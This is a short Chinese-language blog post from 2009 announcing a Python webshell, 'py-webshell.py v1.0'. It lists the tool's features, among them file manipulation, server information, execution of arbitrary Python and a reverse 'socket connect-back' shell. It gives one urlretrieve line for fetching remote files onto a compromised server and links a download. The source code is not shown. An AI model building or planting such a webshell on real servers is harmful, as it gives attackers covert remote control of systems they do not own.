---
title: py-webshell.py v1.0
description: python版的webshell——py-webshell.pyv1.01.0版本的功能有：1、文件、文件夹相关信息统计与操作功能，比如：列、删除、复制、读取、创建等等。2、服务器信息查看。3、执行自定义python命令。4、socket反弹。
date: 2009-03-20 08:27:38
category: 安全工具
tags: ['Python', 'webshell']
post_id: 819
alias: py-webshell.py-v1.0
ViewNums: 3335
---

python版的webshell——[py-webshell.py v1.0](/blog/py-webshellpy-v10)

1.0版本的功能有：

1、文件、文件夹相关信息统计与操作功能，比如：列、删除、复制、读取、创建等等。
2、服务器信息查看。
3、执行自定义python命令。
4、socket反弹。

这个周末随写而成，界面清爽:)，目前这个webshell使用起来还是比较爽的，我没加上文件的上传与下载功能，因为使用python进行基于web的文件上传下载我还不清楚如何进行，目前想到一个方案：

urllib.urlretrieve(url,localpath) #直接在webshell内执行这段代码，下载远程域上url对应的资源到localpath指定的服务端路径。

截图：

[![py_webshell 1.0](http://huaidan.org/wp-content/uploads/2009/03/py_webshell-500x218.gif "py_webshell 1.0")](/blog/py-webshellpy-v10)

这个webshell其实还比较多功能可以去设计，出于**研究学习**的目的只要有时间我就会继续完善。其中“Socket反弹”这个功能需要你在本地开个python socket与你的webshell进行通信，如果这个设计好的话，会非常的爽，使用过rpyc的朋友就会知道了:)。

下载地址：[py-webshell.py v1.0](/blog/download.asp?id=307

来源：[Xeye Hack Team](http://xeye.us/blog/2009/03/py-webshell-v1/)

